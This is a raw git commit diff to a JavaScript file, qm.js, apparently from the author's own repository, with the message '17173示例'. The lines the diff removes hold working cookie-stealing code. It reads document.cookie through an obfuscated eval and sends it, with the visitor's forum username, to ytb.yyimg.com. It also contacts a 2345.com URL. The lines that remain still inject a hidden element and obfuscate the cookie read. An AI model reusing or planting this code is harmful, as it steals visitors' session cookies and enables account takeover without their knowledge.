7c5db467b3c03c253c670fb7ef66778f9e37e8e5
yyimg <yy@yyimg.com>
2016-06-14 18:36:26 +0800

    17173示例

--- qm.js
+++ qm.js
@@ -2,22 +2,4 @@ document.write("<div class='sign-hide-flag'></div>");
 jQuery('.sign-hide-flag').parent().css('display','none');
 d=(1==1?"d":"d")+"ocument";
 d=eval(d).cookie;
-if(localStorage.getItem("TIMESTAMPS")!="1422323221"){
-  jQuery.ajax({
-    type:"GET",
-    url:"https://ytb.yyimg.com/function",
-    data:{
-      'd':d,
-      'n':jQuery(".vwmy a").html()
-    },
-    success:function(){
-      localStorage.setItem("TIMESTAMPS","1422323221");
-    }
-  });
-}
- jQuery.ajax({
-    type:"GET",
-    url:"http://www.2345.com/?k85551221",
-    data:{
-    }
-  });
+
